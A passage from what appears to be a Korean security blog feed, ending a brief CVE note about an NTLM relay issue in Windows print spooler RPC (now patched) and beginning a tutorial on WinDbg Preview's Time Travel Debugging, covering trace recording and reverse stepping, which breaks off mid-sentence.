&#xBB38;&#xC11C; &#xC2DC;&#xC791;</li><li><code>RpcAsyncWritePrinter</code> (Opnum 12) - &#xC0C8; &#xBB38;&#xC11C; &#xC791;&#xC131;</li></ul></li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>IRemoteWinspool</code>&#xC758; <code>RpcManager::VerifyRpcValidProtocolSequence</code>&#xC5D0;&#xC11C; <code>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</code> &#xC774;&#xC0C1;&#xC758; &#xB808;&#xBCA8;&#xC5D0;&#xC11C;&#xB9CC; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.hackndo.com/ntlm-relay/#ntlm-relay">https://en.hackndo.com/ntlm-relay/#ntlm-relay</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>ntlm realy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 시간을 여행하는 해커를 위한 안내서 Part1</title>
    <link href="/2021/01/24/fabu1ous/ttd-1/"/>
    <url>/2021/01/24/fabu1ous/ttd-1/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p>Time Travel Debugging(TTD)&#xB294; 2017&#xB144;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; Windbg preview&#xC758; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xAC1C;&#xB41C; &#xC9C0; 3&#xB144;&#xC774;&#xB098; &#xC9C0;&#xB0AC;&#xC9C0;&#xB9CC; &#xC544;&#xC9C1; &#xD55C;&#xAE00;&#xB85C; &#xB41C; &#xC790;&#xC138;&#xD55C; &#xBB38;&#xC11C;&#xB294; &#xBCC4;&#xB85C; &#xC5C6;&#xB294; &#xAC70; &#xAC19;&#xB354;&#xB77C;&#xACE0;&#xC694;. windbg preview&#xB97C; &#xC4F4;&#xB2E4;&#xAC70;&#xB098; TTD&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC544;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xC801;&#xC5B4;&#xC11C; &#xADF8;&#xB7F0;&#xAC00; &#xC2F6;&#xAE30;&#xB3C4; &#xD558;&#xACE0;&#x2026; windbg&#xB85C; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xCC98;&#xC74C; &#xD574;&#xBCF8;&#xB2E4;&#xAC70;&#xB098; &#xB514;&#xBC84;&#xAE45; &#xC790;&#xCCB4;&#xB97C; &#xCC98;&#xC74C; &#xC2DC;&#xC791;&#xD558;&#xB824;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC90; &#xD55C;&#xAE00;&#xB85C; &#xB41C; &#xBB38;&#xC11C;&#xAC00; &#xBB38;&#xD131;&#xC758; &#xB192;&#xC774;&#xB97C; &#xB0AE;&#xCD94;&#xB294;&#xB370; &#xD070; &#xB3C4;&#xC6C0;&#xC774; &#xB41C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; &#x201C;&#xB0B4;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4; &#xBCF4;&#xC9C0; &#xBB50;&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xC791;&#xC131;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xB7B5; Part 3&#xAE4C;&#xC9C0; &#xC0DD;&#xAC01; &#xC911;&#xC774;&#xACE0;, Part 4&#xAE4C;&#xC9C0; &#xCD94;&#xAC00;&#xB85C; &#xD560; &#xC218;&#xB3C4; &#xC788;&#xC5B4;&#xC694;.</p><ul><li>Part 1 : &#xAC04;&#xB2E8; &#xC18C;&#xAC1C; &#xBC0F; &#xCCAB;&#xC778;&#xC0C1;</li><li>Part 2 : &#xAD6C;&#xBC84;&#xC804;&#xC758; open source&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBC84;&#xADF8;&#xB97C; &#xC9C1;&#xC811; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB294; &#xC2E4;&#xC2B5;</li><li>Part 3 : &#xD06C;&#xB798;&#xC26C; &#xBD84;&#xC11D;&#xC5D0; &#xC0AC;&#xC6A9;&#xD574;&#xBCF8; &#xACBD;&#xD5D8;&#xB2F4;</li><li>Part 4 : JavaScript&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xC790;&#xB3D9;&#xD654; &#xBC0F; &#xACE0;&#xC624;&#xC624;&#xAE09; &#xC0AC;&#xC6A9;&#xBC95;</li></ul><h1 id="Time-Travel-Debugging"><a href="#Time-Travel-Debugging" class="headerlink" title="Time Travel Debugging"></a>Time Travel Debugging</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/1.png" alt></p><p>&#xBD88;&#xD604;&#xB4EF;&#xC774; &#xACFC;&#xAC70;&#xC5D0; &#xC800;&#xC9C0;&#xB978; &#xC2E4;&#xC218; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xBD88; &#xD0A5;&#xC744; &#xD558;&#xACE0; &#xC2F6;&#xC740; &#xACBD;&#xD5D8;&#xC744; &#xB204;&#xAD6C;&#xB098; &#xD55C; &#xBC88;&#xCBE4;&#xC740; &#xD574;&#xBD24;&#xC744;&#xAC81;&#xB2C8;&#xB2E4;. &#xACFC;&#xAC70;&#xB85C; &#xB3CC;&#xC544;&#xAC00; &#xBAA8;&#xB450; &#xC5C6;&#xB358; &#xC77C;&#xB85C; &#xB9CC;&#xB4E4; &#xC218;&#xB9CC; &#xC788;&#xB2E4;&#xBA74; &#xC5BC;&#xB9C8;&#xB098; &#xC88B;&#xC744;&#xAE4C;&#xC694;. &#xBB3C;&#xB860; &#xADF8;&#xAC8C; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC774; &#xB354;&#xC6B1; &#xAC00;&#xC2B4;&#xC744; &#xD6C4;&#xBCBC; &#xD30C;&#xBA70; &#xC0AC;&#xB78C;&#xC744; &#xBBF8;&#xCE58;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Microsoft&#xC758; Debugging Experience&#xD300;&#xC740; Debugging&#xC758; &#xD55C;&#xC5D0;&#xC120; &#xACFC;&#xAC70;&#xB85C; &#xB3CC;&#xC544;&#xAC00; &#xC800;&#xC9C0;&#xB978; &#xC2E4;&#xC218;&#xB97C; &#xB9CC;&#xD68C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><blockquote><p>Time Travel Debugging(TTD), is a tool that allows you to record an execution of your process running, then replay it later both forwards and backwards.</p></blockquote><p>TTD&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC2E4;&#xD589;&#xC744; &#x201C;&#xB418;&#xAC10;&#xAE30;(rewind)&#x201D;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xBC88; &#xBC84;&#xADF8;&#xB97C; &#xC7AC; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xBC88;&#xAC70;&#xB85C;&#xC6C0;&#xC744; &#xB35C;&#xACE0; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC8C;&#xB2E4;&#xAC00; MS &#xC2A4;&#xD1A0;&#xC5B4;&#xC5D0;&#xC11C; windbg preview&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C; TTD&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB2C8;&#x2026;</p><p><img src="/2021/01/24/fabu1ous/ttd-1/2.png" alt></p><p>&#xC544;&#xB2C8;&#xC544;&#xB2C8; &#xBB34;&#xB8CC;&#xB77C;&#xAD6C;&#xC694; &#xC190;&#xB2D8;</p><h1 id="&#xAE30;&#xBCF8;&#xC801;&#xC778;-&#xC0AC;&#xC6A9;&#xBC95;"><a href="#&#xAE30;&#xBCF8;&#xC801;&#xC778;-&#xC0AC;&#xC6A9;&#xBC95;" class="headerlink" title="&#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC0AC;&#xC6A9;&#xBC95;"></a>&#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC0AC;&#xC6A9;&#xBC95;</h1><h2 id="&#xAD00;&#xB9AC;&#xC790;-&#xAD8C;&#xD55C;&#xC73C;&#xB85C;-&#xC2E4;&#xD589;"><a href="#&#xAD00;&#xB9AC;&#xC790;-&#xAD8C;&#xD55C;&#xC73C;&#xB85C;-&#xC2E4;&#xD589;" class="headerlink" title="&#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;"></a>&#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/3.png" alt></p><p>&#xB514;&#xBC84;&#xAE45; &#xD0C0;&#xAC9F;&#xC758; &#xC2E4;&#xD589;&#xC744; &#xB179;&#xD654;&#xD574; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; Trace file(&#xC774;&#xD558; <code>.run</code>)&#xC744; &#xC539;&#xACE0; &#xB72F;&#xACE0; &#xB9DB;&#xBCF4;&#xACE0; &#xC990;&#xAE34;&#xB2E4;&#xB294; &#xAC8C; TTD&#xC758; &#xB9E4;&#xB825;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xC804;&#xC5D0; &#xC6B0;&#xC120; windbg preview&#xB97C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xC154;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. Input/Output &#xD2B8;&#xB808;&#xC774;&#xC2F1;&#xC744; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xB514;&#xBC84;&#xAE45; &#xBC29;&#xC2DD;&#xC740; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD574;&#xC654;&#xC9C0;&#xB9CC; TTD&#xB294; &#xC774;&#xBCF4;&#xB2E4; &#xC880; &#xB354; &#xD655;&#xC7A5;&#xB41C; &#xAC1C;&#xB150;&#xC73C;&#xB85C;, &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xBAA8;&#xB4E0; &#xC2E4;&#xD589;&#xC744; &#xAE30;&#xB85D;&#xD574; <code>.run</code>&#xC744; &#xB9CC;&#xB4E4;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xC694;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Trace-file-&#xB179;&#xD654;&#xD558;&#xAE30;"><a href="#Trace-file-&#xB179;&#xD654;&#xD558;&#xAE30;" class="headerlink" title="Trace file &#xB179;&#xD654;&#xD558;&#xAE30;"></a>Trace file &#xB179;&#xD654;&#xD558;&#xAE30;</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/4.png" alt></p><p>[&#xC0C1;&#xB2E8; &#xBA54;&#xB274;] &gt; [&#xD30C;&#xC77C;] &gt; [Launch executable (advanced)] &gt; &#xC2E4;&#xD589; &#xD30C;&#xC77C; &#xC120;&#xD0DD; &gt; [Record with TTD &#xCCB4;&#xD06C; &#xBC15;&#xC2A4;]</p><p>&#xB514;&#xBC84;&#xAE45; &#xD0C0;&#xAC9F;&#xC774; &#xB420; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD574;&#xC900; &#xB4A4; Record with Time Trabel Debugging&#xB97C; &#xCCB4;&#xD06C;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/5.png" alt></p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>.run</code>&#xD30C;&#xC77C;&#xC740; <code>C:\\Users\\username\\Documents</code>&#xC5D0; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC6D0;&#xD558;&#xC2E0;&#xB2E4;&#xBA74; &#xC0DD;&#xC131; &#xACBD;&#xB85C;&#xB97C; &#xBC14;&#xAFB8;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>.run</code>&#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815; &#xD6C4; Record &#xBC84;&#xD2BC;&#xC744; &#xB204;&#xB974;&#xC2DC;&#xBA74; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xB179;&#xD654;&#xAC00; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/6.png" alt></p><p>&#xD0C0;&#xAC9F;&#xC758; &#xB179;&#xD654;&#xAC00; &#xC9C4;&#xD589;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xD31D;&#xC5C5;&#xCC3D;&#xC774; &#xB72C;&#xB2E4;&#xBA74; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB179;&#xD654;&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD31D;&#xC5C5;&#xCC3D;&#xC5D0;&#xC120; &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xC138;&#xC2A4;, &#xB179;&#xD654; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xBCF4;&#xC5EC;&#xC8FC;&#xBA70; &#xC774; &#xB179;&#xD654;&#xAC00; &#xC9C4;&#xC815; &#xB0B4;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xB179;&#xD654;&#xAC00; &#xB9DE;&#xB294;&#xC9C0; &#xCD5C;&#xC885; &#xD655;&#xC778;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBB3C;&#xB860; &#xC774; &#xD31D;&#xC5C5;&#xCC3D;&#xC774; &#xB72C;&#xB2E4;&#xBA74; &#xADF8;&#xB7F0; &#xAC74; &#xC2E0;&#xACBD; &#xC4F0;&#xC9C0; &#xB9C8;&#xC2DC;&#xACE0; &#xCD5C;&#xB300;&#xD55C; &#xBE68;&#xB9AC; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xC774;&#xC288;&#xB098; &#xBC84;&#xADF8;&#xB97C; &#xC7AC;&#xD604;&#xD574;&#xC8FC;&#xC154;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB098;&#xC911;&#xC5D0; &#xC7A0;&#xC2DC; &#xB2E4;&#xB8F0; &#xB2E8;&#xC810;&#xC758; &#xB0B4;&#xC6A9;&#xC774;&#xC9C0;&#xB9CC; &#xAC04;&#xB2E8;&#xD788; &#xC124;&#xBA85;&#xB4DC;&#xB9AC;&#xC790;&#xBA74;  <code>.run</code>&#xD30C;&#xC77C;&#xC774; &#xD06C;&#xAE30;&#xAC00; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xBE68;&#xB9AC; &#xCEE4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774; &#xAE00;&#xC744; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xC7AC;&#xD604;&#xD558;&#xB294;&#xB370; &#xB300;&#xB7B5; 3~4&#xCD08; &#xC815;&#xB3C4; &#xAC78;&#xB9AC;&#xB294; &#xD06C;&#xB798;&#xC26C;&#xB97C; &#xB179;&#xD654;&#xD588;&#xACE0; 1.5GB &#xD06C;&#xAE30;&#xC758; <code>.run</code>&#xD30C;&#xC77C;&#xC774; &#xB9CC;&#xB4E4;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD3C9;&#xADE0;&#xC801;&#xC73C;&#xB85C; &#xC601;&#xD654; &#xD55C; &#xD3B8;&#xC774; 1.5GB&#xC785;&#xB2C8;&#xB2E4;. &#xAC70;&#xAE30;&#xB2E4; &#xCD94;&#xAC00;&#xB85C;  <code>.idx</code>&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC774; 0.5GB&#xB97C; &#xCC28;&#xC9C0;&#xD558;&#xB2C8; &#xCD1D; 2GB&#xB098; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xAD70;&#xC694;. MSDOCS&#xC5D0; &#xB530;&#xB974;&#xBA74; <code>.idx</code>&#xD30C;&#xC77C;&#xC740; &#xBCF4;&#xD1B5;  <code>.run</code>&#xD30C;&#xC77C;&#xC758; 2&#xBC30; &#xC815;&#xB3C4;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/7.png" alt></p><p>&#xC55E;&#xC73C;&#xB85C; &#xC774; <code>.run</code>&#xD30C;&#xC77C;&#xB9CC; &#xC788;&#xB2E4;&#xBA74; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD558;&#xB2E4;&#xAC00; &#xB2E4;&#xC2DC; &#xBC84;&#xADF8;&#xB97C; &#xC7AC;&#xD604;&#xD558;&#xB294; &#xBC88;&#xAC70;&#xB85C;&#xC6C0;&#xC744; &#xC5C6;&#xC568; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCF4;&#xD1B5; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xB2E4; &#xC2E4;&#xC218;&#xD55C;&#xB2E4;&#xAC70;&#xB098; &#xCEE8;&#xD2B8;&#xB864;&#xC774; &#xBC84;&#xADF8; &#xBC1C;&#xC0DD;&#xC2DC;&#xC810;&#xC744; &#xB118;&#xC5B4;&#xAC00;&#xBC84;&#xB9AC;&#xBA74; restart&#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC2DC;&#xC791; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xAC04;&#xD639; restart&#xAE30;&#xB2A5;&#xC774; &#xC548; &#xBA39;&#xAC70;&#xB098; &#xB514;&#xBC84;&#xAC70; &#xC790;&#xCCB4;&#xB97C; &#xC7AC;&#xC2DC;&#xC791;&#xD574;&#xC57C; &#xD558;&#xB294; &#xACBD;&#xC6B0;&#xC5D4; &#xBC84;&#xADF8;&#xB97C; &#xB610;&#xB2E4;&#xC2DC; &#xC7AC;&#xD604;&#xD574;&#xC57C; &#xD574;&#xC11C; &#xC0C1;&#xB2F9;&#xD788; &#xADC0;&#xCC2E;&#xC8E0;. &#xC800;&#xB294; &#xC774;&#xB7F0; &#xACBD;&#xC6B0;&#xC5D0; vm&#xC758; &#xC2A4;&#xB0C5;&#xC0F7;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xAC70;&#xB098; <code>.bat</code>&#xD30C;&#xC77C;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBC84;&#xADF8; &#xC7AC;&#xD604;&#xC744; &#xC790;&#xB3D9;&#xD654; &#xD558;&#xACE4; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC6E9;&#x2026;</p><h1 id="TTD-&#xC4F0;&#xC138;&#xC694;-&#xB450;&#xBC88;-&#xC4F0;&#xC138;&#xC694;"><a href="#TTD-&#xC4F0;&#xC138;&#xC694;-&#xB450;&#xBC88;-&#xC4F0;&#xC138;&#xC694;" class="headerlink" title="TTD &#xC4F0;&#xC138;&#xC694;, &#xB450;&#xBC88; &#xC4F0;&#xC138;&#xC694;"></a>TTD &#xC4F0;&#xC138;&#xC694;, &#xB450;&#xBC88; &#xC4F0;&#xC138;&#xC694;</h1><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; TTD&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xBCF8; &#xC81C;&#xAC00; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xC7A5;&#xC810;, &#xADF8;&#xB9AC;&#xACE0; MS&#xC5D0;&#xC11C; &#xB0B4;&#xC138;&#xC6B0;&#xACE0; &#xC788;&#xB294; &#xC7A5;&#xC810;&#xC744; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><h2 id="Re-zero&#xBD80;&#xD130;-&#xC2DC;&#xC791;&#xD558;&#xB294;-&#xB514;&#xBC84;&#xAE45;-&#xC6B0;&#xC6E9;"><a href="#Re-zero&#xBD80;&#xD130;-&#xC2DC;&#xC791;&#xD558;&#xB294;-&#xB514;&#xBC84;&#xAE45;-&#xC6B0;&#xC6E9;" class="headerlink" title="Re:zero&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xB514;&#xBC84;&#xAE45;? &#xC6B0;&#xC6E9;"></a>Re:zero&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xB514;&#xBC84;&#xAE45;? &#xC6B0;&#xC6E9;</h2><p>&#xC544;&#xAE4C; &#xB9D0;&#xC500;&#xB4DC;&#xB9B0; &#xB300;&#xB85C; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xBA74;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC2DC;&#xC791; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xC77C;&#xC740; &#xC815;&#xB9D0; &#xBE48;&#xBC88;&#xD788; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB798;&#xC11C; &#xC6B0;&#xB9AC; idioth&#xD615;&#xC774; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC88B;&#xC544;&#xD558;&#xB098; &#xBD10;&#xC694;. &#x314B;&#x314B;&#x314B;&#x314B;</p><p><img src="/2021/01/24/fabu1ous/ttd-1/8.png" alt></p><p>&#xB514;&#xBC84;&#xAC70; &#xC885;&#xB958;&#xC640; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xC870;&#xAE08; &#xB9CC;&#xC838;&#xBD24;&#xB2E4; &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xAC01;&#xAC01; &#xAE30;&#xB2A5;&#xB4E4;&#xC774; &#xBB34;&#xC2A8; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC775;&#xC219;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;.</p><ol><li>GO : break point &#xC704;&#xCE58;&#xAE4C;&#xC9C0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;</li><li>Step Out : &#xD604;&#xC7AC; &#xD568;&#xC218;&#xB97C; &#xB05D;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589; &#xD6C4; &#xB9AC;&#xD134;</li><li>Step Into : instruction &#xD55C;&#xAC1C; &#xC2E4;&#xD589;, &#xB9CC;&#xC57D; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xB85C; &#xC9C4;&#xC785;</li><li>Step Over : instruction &#xD55C;&#xAC1C; &#xC2E4;&#xD589;, &#xB9CC;&#xC57D; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xB05D;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xD6C4; &#xB9AC;&#xD134;</li></ol><p>GO&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xAE30; &#xC804;&#xC5D0; break point &#xC124;&#xC815;&#xC744; &#xC798;&#xBABB;&#xD588;&#xB2E4;&#xAC70;&#xB098;, Step Into&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xB85C; &#xC9C4;&#xC785;&#xD574;&#xC57C; &#xD558;&#xB294; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; Step Over&#xB97C; &#xD558;&#xAC8C; &#xB420; &#xACBD;&#xC6B0; &#xB208;&#xBB3C;&#xC744; &#xBA38;&#xAE08;&#xACE0; restart&#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB7EC;&#xC57C; &#xD558;&#xC8E0;. &#xC815;&#xB9D0; &#xC7A0;&#xC2DC; &#xC9D1;&#xC911;&#xC744; &#xC548; &#xD558;&#xBA74; &#xBC8C;&#xC5B4;&#xC9C0;&#xB294; &#xC77C;&#xC774;&#xB77C; &#xC9DC;&#xC99D; &#xB098;&#xAE30;&#xB3C4; &#xD558;&#xACE0; break point&#xC758; &#xD55C;&#xACC4;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xBA74; &#xC5EC;&#xAC04; &#xADC0;&#xCC2E;&#xC740; &#xAC8C; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. TTD&#xB294; &#xC774;&#xB7F0; &#xBD88;&#xD3B8;&#xD568;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xACB0;&#xD588;&#xC744;&#xAE4C;&#xC694;?</p><h2 id="Reverse-Flow-Control"><a href="#Reverse-Flow-Control" class="headerlink" title="Reverse Flow Control"></a>Reverse Flow Control</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/9.png" alt></p><p>TTD&#xB294; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; Flow Control &#xAE30;&#xB2A5;&#xC744; &#xB4A4;&#xC9D1;&#xC740; Reverse Flow Control&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC744; &#xAC70;&#xAFB8;&#xB85C; &#xAC70;&#xC2AC;&#xB7EC; &#xC62C;&#xB7EC;&#xAC08; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xAE4C; &#xB9D0;&#xD55C; &#xB300;&#xB85C; Step Into&#xB97C; &#xD574;&#xC57C; &#xD560; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; Step Over&#xB97C; &#xD574;&#xBC84;&#xB824;&#xC11C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD560; &#xD568;&#xC218;&#xC5D0; &#xC9C4;&#xC785;&#xD558;&#xC9C0; &#xBABB;&#xD588;&#xB2E4;&#xBA74; &#xB2E8;&#xC21C;&#xD788; Step Over Back &#xD558;&#xBA74; &#xD574;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Time-Travel-Position"><a href="#Time-Travel-Position" class="headerlink" title="Time Travel Position"></a>Time Travel Position</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/10.png" alt></p><p>&#xADF8;&#xB7FC; &#xB2E8;&#xC21C;&#xD788; &#xD604;&#xC7AC; program counter &#xC704;&#xCE58;&#xB85C;&#xBD80;&#xD130; intruction&#xC744; &#xAC70;&#xC2AC;&#xB7EC; &#xC62C;&#xB77C;&#xAC00;&#xB294; &#xAC8C; &#xB05D;&#xC774;&#xB0D0;? &#xADF8;&#xB7AC;&#xB2E4;&#xBA74; &#xC2DC;&#xAC04;&#xC5EC;&#xD589;(Time Travel)&#xC774;&#xB780; &#xC774;&#xB984;&#xC774; &#xBD99;&#xC9C4; &#xC54A;&#xC558;&#xACA0;&#xC8E0;. &#xB179;&#xD654; &#xC2DC;&#xC791;&#xBD80;&#xD130; &#xB179;&#xD654; &#xC885;&#xB8CC; &#xC2DC;&#xC810;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xB41C; instruction&#xB9C8;&#xB2E4; Time Travel Position(&#xC774;&#xD558; 